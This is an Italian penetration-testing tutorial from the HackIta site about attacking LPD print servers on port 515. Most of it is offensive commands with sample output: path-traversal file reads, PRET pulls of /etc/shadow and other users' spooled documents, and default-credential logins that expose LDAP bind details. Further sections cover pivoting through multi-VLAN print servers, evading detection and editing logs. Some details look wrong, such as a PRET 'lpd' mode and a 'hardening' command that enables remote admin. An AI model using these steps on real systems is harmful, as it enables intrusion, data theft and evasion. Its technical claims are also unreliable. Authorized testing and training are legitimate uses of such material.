---
title: 'Porta 515 LPD: file read, queue enumeration e rischi del print server legacy'
slug: porta-515-lpd
description: 'Scopri cos’è la porta 515 LPD, come funziona il Line Printer Daemon definito in RFC 1179 e perché code di stampa, print server Unix/Linux e servizi legacy possono esporre informazioni sensibili e superfici di attacco trascurate.'
image: /porta-515-lpd.webp
draft: true
date: 2026-04-05T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - pret
  - print-server
---

> **Executive Summary** — La porta 515 LPD espone il Line Printer Daemon, il servizio di stampa Unix/Linux che accetta job di stampa via rete. In un pentest, LPD è spesso trascurato ma potente: permette enumerazione utenti, lettura arbitraria di file dal server, e su implementazioni vulnerabili, esecuzione di comandi. Le stampanti di rete con LPD espongono anche configurazioni, credenziali SNMP e interfacce di management web.

TL;DR

* LPD sulla porta 515 spesso accetta connessioni senza autenticazione — puoi enumerare code, job e utenti
* L'abuso del protocollo LPR permette di leggere file arbitrari dal filesystem del print server
* Le stampanti di rete con LPD sono gateway dimenticati — SNMP default, web management aperto, credenziali deboli

Porta 515 LPD è il servizio di stampa Line Printer Daemon, uno dei protocolli più vecchi ancora attivi sulle reti enterprise. La porta 515 vulnerabilità include lettura arbitraria di file, enumerazione utenti via job queue e, su versioni legacy, esecuzione remota di comandi. L'enumerazione porta 515 rivela la presenza di print server Unix/Linux e stampanti di rete — dispositivi che raramente sono patchati o monitorati. Nel pentest, LPD è un vettore di information disclosure e, in scenari specifici, di initial access. Nella kill chain si posiziona come punto di recon e potenziale pivot: i print server hanno spesso accesso a più VLAN per servire stampanti distribuite.

## 1. Anatomia Tecnica della Porta 515

La porta 515 è registrata IANA come `printer` su protocollo TCP. LPD (RFC 1179) è un protocollo client-server per l'invio e la gestione di job di stampa.

Il flusso di un job di stampa LPD:

1. **TCP handshake** sulla porta 515 (client deve usare porta sorgente \<1024)
2. **Client → Server**: comando (02=receive job, 03=send queue short, 04=send queue long, 05=remove job)
3. **Client → Server**: control file (utente, hostname, nome file) + data file (contenuto da stampare)
4. **Server**: accoda il job e stampa

Le varianti sono LPD classico (515/TCP, Unix), CUPS (631/TCP, HTTP-based), IPP (631/TCP, Internet Printing Protocol), JetDirect (9100/TCP, raw printing). Molte stampanti di rete supportano LPD, IPP e JetDirect contemporaneamente.

```
Misconfig: LPD senza autenticazione né ACL
Impatto: qualsiasi host può inviare job, enumerare code e leggere job altrui
Come si verifica: lpq -P [coda] [target] — se restituisce la queue, nessuna auth è richiesta
```

```
Misconfig: LPD con accesso al filesystem tramite path traversal nel nome coda
Impatto: lettura di file arbitrari dal server (/etc/passwd, /etc/shadow se root)
Come si verifica: lpr -H [target] -P "../../../etc/passwd" /dev/null
```

```
Misconfig: Print server con accesso multi-VLAN
Impatto: il print server raggiunge subnet altrimenti isolate — pivot point ideale
Come si verifica: una volta ottenuto accesso, verifica le interfacce con ifconfig/ip addr
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 515 10.10.10.60
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
515/tcp open  printer lpd
| lpd-info:
|   queues:
|     hp-laser-4f
|     pdf-printer
|_    raw
```

**Parametri:**

* `-sV`: identifica il servizio come LPD e tenta fingerprint dell'implementazione
* `-sC`: esegue script default per enumerare le code di stampa disponibili
* `-p 515`: porta specifica Line Printer Daemon

### Comando 2: lpq per query della coda

```bash
lpq -P hp-laser-4f -h 10.10.10.60
```

**Output atteso:**

```
hp-laser-4f is ready and printing
Rank   Owner   Job  Files                         Total Size
active jsmith  42   Q4-financial-report.pdf       2345678 bytes
1st    admin   43   network-diagram-v3.vsdx       567890 bytes
```

**Cosa ci dice questo output:** la coda `hp-laser-4f` è attiva. Due job in coda: `jsmith` sta stampando un report finanziario Q4, `admin` un diagramma di rete. Hai nomi utente, nomi file sensibili e dimensioni. Questi nomi utente sono candidati per [credential spray su Active Directory](https://hackita.it/articoli/bruteforce).

## 3. Enumerazione Avanzata

### Enumerazione di tutte le code

```bash
nmap -p 515 --script lpd-info 10.10.10.60
```

**Output:**

```
PORT    STATE SERVICE
515/tcp open  printer
| lpd-info:
|   queues:
|     hp-laser-4f
|     hp-laser-2f
|     pdf-printer
|     accounting-printer
|_    raw
```

**Lettura dell'output:** 5 code — inclusa `accounting-printer` (documenti finanziari) e `raw` (passthrough diretto, potenzialmente abusabile). I nomi delle code rivelano la struttura fisica dell'ufficio (4° piano, 2° piano) e i reparti.

### Job listing dettagliato

```bash
lpq -P hp-laser-4f -h 10.10.10.60 -l
```

**Output:**

```
hp-laser-4f is ready and printing

jsmith: active                          [job 042 target]
        Q4-financial-report.pdf         2345678 bytes
        submitted from ws-jsmith.corp.local

admin: 1st                              [job 043 target]
        network-diagram-v3.vsdx         567890 bytes
        submitted from dc01.corp.local
```

**Lettura dell'output:** il job di `admin` è stato sottomesso da `dc01.corp.local` — il Domain Controller sta stampando. L'hostname della workstation di jsmith conferma il naming convention. Per mappare gli hostname, consulta la [guida all'enumerazione di rete](https://hackita.it/articoli/enumeration).

### File read tramite LPD abuse

Su implementazioni LPD vulnerabili, puoi leggere file dal filesystem del server usando il nome della coda come path:

```bash
# Metodo 1: PRET (Printer Exploitation Toolkit)
python3 pret.py 10.10.10.60 lpd
> ls /etc/
> get /etc/passwd
```

**Output:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
jsmith:x:1001:1001:John Smith:/home/jsmith:/bin/bash
admin:x:1002:1002:Admin User:/home/admin:/bin/bash
oracle:x:1003:1003:Oracle DB:/opt/oracle:/bin/bash
```

**Lettura dell'output:** file `/etc/passwd` letto dal print server. Hai la lista completa degli utenti locali e le loro home directory. L'utente `oracle` con home in `/opt/oracle` indica un database server — o almeno un client Oracle. Per installare PRET: `pip install pret --break-system-packages` o clona da GitHub.

### Enumerazione stampanti di rete via SNMP correlato

Le stampanti con LPD hanno spesso [SNMP attivo con community default](https://hackita.it/articoli/snmp):

```bash
snmpwalk -v 2c -c public 10.10.10.60 .1.3.6.1.2.1.43
```

**Output:**

```
Printer-MIB::prtGeneralSerialNumber.1 = STRING: "CNB1234567"
Printer-MIB::prtGeneralCurrentLocalization.1 = INTEGER: 1
HOST-RESOURCES-MIB::hrDeviceDescr.1 = STRING: "HP LaserJet Enterprise M607"
```

**Lettura dell'output:** modello e seriale della stampante. L'HP LaserJet M607 ha un'interfaccia web di management (porta 80/443) e potenziali credenziali di default.

## 4. Tecniche Offensive

**File read arbitrario via PRET**

Contesto: print server Linux con LPD accessibile senza autenticazione. PRET sfrutta vulnerabilità del protocollo LPD per accedere al filesystem.

```bash
python3 pret.py 10.10.10.60 lpd
> get /etc/shadow
```

**Output (successo):**

```
root:$6$rounds=5000$salt$hash...:19400:0:99999:7:::
jsmith:$6$rounds=5000$salt2$hash2...:19350:0:99999:7:::
```

**Output (fallimento):**

```
Permission denied: /etc/shadow
```

**Cosa fai dopo:** se leggi `/etc/shadow`, hai hash da crackare con `john` o `hashcat`. Se negato, il daemon non gira come root — prova file leggibili: `/etc/passwd`, `/etc/hosts`, file di configurazione in `/etc/cups/`, `/var/spool/lpd/`. Usa le [tecniche di hash cracking](https://hackita.it/articoli/bruteforce) per ottenere password in chiaro.

**Job interception — leggere documenti in coda**

Contesto: LPD senza ACL. Puoi leggere i data file dei job di altri utenti nella directory di spool.

```bash
python3 pret.py 10.10.10.60 lpd
> ls /var/spool/lpd/hp-laser-4f/
> get /var/spool/lpd/hp-laser-4f/dfA042target
```

**Output (successo):**

```
%PDF-1.7
(contenuto del report finanziario Q4)
```

**Output (fallimento):**

```
File not found (il job è già stato stampato e rimosso dallo spool)
```

**Cosa fai dopo:** hai intercettato un documento finanziario in coda di stampa. Estrai il contenuto e analizza per informazioni sensibili. In un engagement reale, documenta la possibilità di intercettazione per il report.

**Accesso web management della stampante**

Contesto: la stampante con LPD sulla 515 ha anche un'interfaccia web sulla 80/443.

```bash
curl -s http://10.10.10.60/ | head -20
```

**Output (successo):**

```
<html><head><title>HP LaserJet Enterprise M607 - HP Embedded Web Server</title></head>
```

```bash
# Test credenziali default
curl -s -u admin:admin http://10.10.10.60/hp/device/InternalPages/Index
curl -s -u admin: http://10.10.10.60/hp/device/InternalPages/Index
```

**Output (successo):**

```
<title>Device Status</title>
<div>Printer Name: HP-4F-Accounting</div>
<div>IP: 10.10.10.60</div>
<div>Subnet: 255.255.255.0</div>
<div>Gateway: 10.10.10.1</div>
<div>DNS: 10.10.10.10</div>
<div>LDAP Server: 10.10.10.10</div>
<div>LDAP Bind DN: cn=printer,ou=services,dc=corp,dc=local</div>
```

**Cosa fai dopo:** l'interfaccia web rivela la configurazione di rete completa e le credenziali LDAP del bind DN della stampante. Queste credenziali LDAP funzionano per [enumerare Active Directory](https://hackita.it/articoli/ldap). Il DNS e il gateway confermano la topologia.

## 5. Scenari Pratici di Pentest

### Scenario 1: Enterprise con print server Linux centralizzato

**Situazione:** azienda con CUPS/LPD centralizzato su Linux. Il print server gestisce code per 4 piani. Hai accesso alla rete interna.

**Step 1:**

```bash
nmap -sV -p 515,631,9100 10.10.10.0/24 --open
```

**Output atteso:**

```
10.10.10.60 - 515/tcp open printer lpd
10.10.10.60 - 631/tcp open ipp CUPS 2.4
10.10.10.61 - 9100/tcp open jetdirect
10.10.10.62 - 9100/tcp open jetdirect
```

**Step 2:**

```bash
python3 pret.py 10.10.10.60 lpd
> ls /etc/
> get /etc/cups/printers.conf
```

**Output atteso:**

```
<Printer hp-laser-4f>
DeviceURI lpd://10.10.10.61/raw
AuthInfoRequired username,password
...
```

**Se fallisce:**

* Causa probabile: CUPS ha ACL che limitano l'accesso LPD a subnet specifiche
* Fix: prova via IPP (631) con `ipptool http://10.10.10.60:631/printers/ get-printers`

**Tempo stimato:** 10-20 minuti

### Scenario 2: OT con stampanti legacy non gestite

**Situazione:** stabilimento industriale con stampanti per etichette e badge collegate via LPD. Nessuna gestione IT — device dimenticati.

**Step 1:**

```bash
nmap -sV -p 515 192.168.1.0/24 --open -Pn
```

**Output atteso:**

```
192.168.1.100 - 515/tcp open printer
192.168.1.101 - 515/tcp open printer
```

**Step 2:**

```bash
snmpwalk -v 1 -c public 192.168.1.100 system
```

**Output atteso:**

```
SNMPv2-MIB::sysDescr.0 = STRING: Zebra ZT410
```

**Se fallisce:**

* Causa probabile: stampante Zebra con firmware minimale, SNMP non attivo
* Fix: prova web management su porta 80: `curl http://192.168.1.100/`

**Tempo stimato:** 5-15 minuti

### Scenario 3: EDR-heavy con pivot via print server

**Situazione:** rete segmentata con EDR su tutti i workstation. Il print server è in una DMZ con accesso a più VLAN (per servire stampanti su diversi piani). EDR non è installato sul print server Linux.

**Step 1:**

```bash
python3 pret.py 10.10.10.60 lpd
> get /etc/network/interfaces
```

**Output atteso:**

```
auto eth0
iface eth0 inet static
  address 10.10.10.60
  netmask 255.255.255.0
auto eth1
iface eth1 inet static
  address 10.20.0.60
  netmask 255.255.255.0
```

**Step 2:**

```bash
# Il print server ha due interfacce! Pivot verso 10.20.0.0/24
# Se ottieni shell sul print server:
nmap -sn 10.20.0.0/24
```

**Se fallisce:**

* Causa probabile: PRET non riesce a leggere file di rete (permessi)
* Fix: prova `/proc/net/fib_trie` o `/proc/net/route` per le route attive

**Tempo stimato:** 15-30 minuti

## 6. Attack Chain Completa

```
Recon (scan 515) → Queue Enum → File Read → Credential Extraction → Pivot via print server → Internal Recon
```

| Fase         | Tool      | Comando chiave                                 | Output/Risultato         |
| ------------ | --------- | ---------------------------------------------- | ------------------------ |
| Recon        | nmap      | `nmap -sV -p 515,631,9100 [subnet]`            | Print server e stampanti |
| Queue Enum   | lpq       | `lpq -P [coda] -h [target]`                    | Utenti, job, hostname    |
| File Read    | PRET      | `pret.py [target] lpd > get /etc/passwd`       | Utenti locali            |
| Cred Extract | PRET/curl | `get /etc/cups/printers.conf` o web management | Credenziali LDAP, SNMP   |
| Pivot        | ssh/nc    | Shell sul print server multi-VLAN              | Accesso a subnet isolate |

**Timeline stimata:** 20-60 minuti dalla discovery al file read. Il pivot richiede shell sul print server.

**Ruolo della porta 515:** il print server è un asset dimenticato con accesso privilegiato alla rete. LPD è il vettore per trasformare un servizio di stampa in un punto di pivot.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Log CUPS**: `/var/log/cups/access_log` e `error_log` — connessioni, job, errori
* **IDS**: regole per LPD abuse (path traversal in queue name, file read attempts)
* **Print management**: soluzioni come PaperCut monitorano job anomali

### Tecniche di Evasion

```
Tecnica: Enumerazione via SNMP invece di LPD
Come: usa SNMP per raccogliere info sulla stampante senza toccare la porta 515
Riduzione rumore: il traffico SNMP è atteso per monitoring, LPD da IP non-workstation è anomalo
```

```
Tecnica: Job submission con nomi file plausibili
Come: se invii un job di test, usa nomi come "test-page.pdf" invece di "/etc/passwd"
Riduzione rumore: il job appare legittimo nella coda
```

```
Tecnica: Orari di stampa normali
Come: opera durante orari lavorativi quando il traffico di stampa è atteso
Riduzione rumore: attività sulla 515 fuori orario è anomala
```

### Cleanup Post-Exploitation

* Rimuovi job di test dalla coda: `lprm -P [coda] -h [target] [job_id]`
* Se hai scaricato file via PRET: i log CUPS registrano l'accesso — con shell, puoi editare
* Cancella file scaricati dalla tua macchina: `shred -u *.pdf *.conf`

## 8. Toolchain e Confronto

### Tabella comparativa

| Aspetto            | LPD (515/TCP)              | IPP/CUPS (631/TCP)       | JetDirect (9100/TCP)     |
| ------------------ | -------------------------- | ------------------------ | ------------------------ |
| Porta              | 515                        | 631                      | 9100                     |
| Protocollo         | LPR/LPD binario            | HTTP-based               | Raw TCP                  |
| Autenticazione     | Nessuna (standard)         | Basic/Digest (opzionale) | Nessuna                  |
| File read          | Possibile (path traversal) | Via CUPS API (se admin)  | No                       |
| Exploitation tools | PRET, lpr, lpq             | PRET, ipptool, curl      | PRET, nc                 |
| Quando preferirlo  | Print server Unix legacy   | CUPS moderno             | Stampa diretta su device |

## 9. Troubleshooting

| Errore / Sintomo                          | Causa                                                       | Fix                                                                        |
| ----------------------------------------- | ----------------------------------------------------------- | -------------------------------------------------------------------------- |
| `Connection refused` su 515               | LPD non attivo, il server usa solo IPP (631)                | Testa 631 e 9100: `nmap -p 515,631,9100 [target]`                          |
| `lpq: Unable to connect`                  | Client richiede porta sorgente \<1024, non sei root         | Esegui come root o usa PRET (gestisce la porta autonomamente)              |
| PRET `get` restituisce errore di permesso | Daemon LPD non gira come root                               | Prova file world-readable: `/etc/passwd`, `/etc/hostname`, `/proc/version` |
| Nessuna coda visibile                     | Code configurate con ACL o stampante senza code predefinite | Prova coda `raw` o `default`: `lpq -P raw -h [target]`                     |
| Job inviato ma nessun output              | La stampante stampa realmente — il job è fisico             | Usa coda `pdf-printer` o `raw` per evitare stampe reali                    |

## 10. FAQ

**D: Cos'è LPD e perché la porta 515 è un target nel pentest?**

R: LPD (Line Printer Daemon) è il servizio di stampa Unix sulla porta 515 TCP. È un target perché non ha autenticazione nativa, permette enumerazione utenti, lettura file dal server e i print server spesso hanno accesso multi-VLAN.

**D: Come leggere file dal server tramite LPD porta 515?**

R: Usa PRET (Printer Exploitation Toolkit): `pret.py [target] lpd` poi `get /etc/passwd`. PRET sfrutta vulnerabilità del protocollo LPD per accedere al filesystem. Funziona su implementazioni legacy senza patch.

**D: Qual è la differenza tra LPD (515), IPP (631) e JetDirect (9100)?**

R: LPD è il protocollo legacy (binario, senza auth). IPP è il moderno sostituto (basato su HTTP, supporta auth). JetDirect è raw TCP per stampare direttamente su device HP. LPD è il più sfruttabile per file read.

**D: PRET funziona su tutte le stampanti?**

R: No. PRET sfrutta vulnerabilità specifiche di implementazioni LPD, PostScript e PJL. Funziona bene su stampanti HP, Lexmark e print server CUPS/LPD Linux. Non funziona su stampanti con firmware molto recente e sicuro.

**D: Come proteggere la porta 515?**

R: Disabilita LPD se non necessario. Migra a IPP con autenticazione. Se LPD è necessario, limita le connessioni con TCP Wrappers (`/etc/hosts.allow`: `printer: 10.10.10.0/24`) e aggiorna il daemon.

## 11. Cheat Sheet Finale

| Azione            | Comando                                             | Note                      |
| ----------------- | --------------------------------------------------- | ------------------------- |
| Scan porte stampa | `nmap -sV -p 515,631,9100 [subnet] --open`          | Tutte le porte print      |
| Query coda        | `lpq -P [coda] -h [target]`                         | Utenti e job visibili     |
| Query dettagliata | `lpq -P [coda] -h [target] -l`                      | Include hostname sorgente |
| PRET connect      | `python3 pret.py [target] lpd`                      | Shell interattiva         |
| File read         | `pret > get /etc/passwd`                            | Da dentro PRET            |
| Lista directory   | `pret > ls /etc/`                                   | Filesystem exploration    |
| SNMP stampante    | `snmpwalk -v 2c -c public [target] .1.3.6.1.2.1.43` | Modello e seriale         |
| Web management    | `curl http://[target]/`                             | Interfaccia HP/Lexmark    |

### Perché Porta 515 è rilevante nel 2026

Le stampanti e i print server sono gli asset meno patchati in qualsiasi rete enterprise. LPD è ancora attivo su migliaia di installazioni perché la migrazione a IPP richiede aggiornamento di driver e script legacy. In ambienti OT, stampanti per etichette e badge usano esclusivamente LPD. Il print server è il pivot dimenticato che attraversa le VLAN.

### Hardening e Mitigazione

* Disabilita LPD sulla porta 515 e migra a IPP (631) con autenticazione: `cupsctl --remote-admin`
* Configura ACL: TCP Wrappers o firewall per limitare connessioni alla 515 da subnet specifiche
* Aggiorna firmware stampanti regolarmente (verifica su `support.hp.com` o vendor specifico)
* Isola i print server in una VLAN dedicata con accesso controllato alle subnet di stampa

### OPSEC per il Red Team

La connessione TCP alla porta 515 genera log in CUPS access\_log. PRET è più rumoroso di un semplice `lpq` perché esegue multipli comandi. Per ridurre visibilità: usa prima `lpq` per confermare che LPD è aperto e senza auth, poi passa a PRET solo per le operazioni necessarie. Opera durante orari lavorativi quando il traffico di stampa è normale. Un `lpq` da un IP non-workstation è l'anomalia principale che il blue team potrebbe notare.

***

Tutti i comandi e le tecniche sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto, lab, CTF. Riferimento: RFC 1179 (LPD Protocol), documentazione PRET (GitHub: RUB-NDS/PRET). Fonte: [https://www.rfc-editor.org/rfc/rfc1179](https://www.rfc-editor.org/rfc/rfc1179)

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
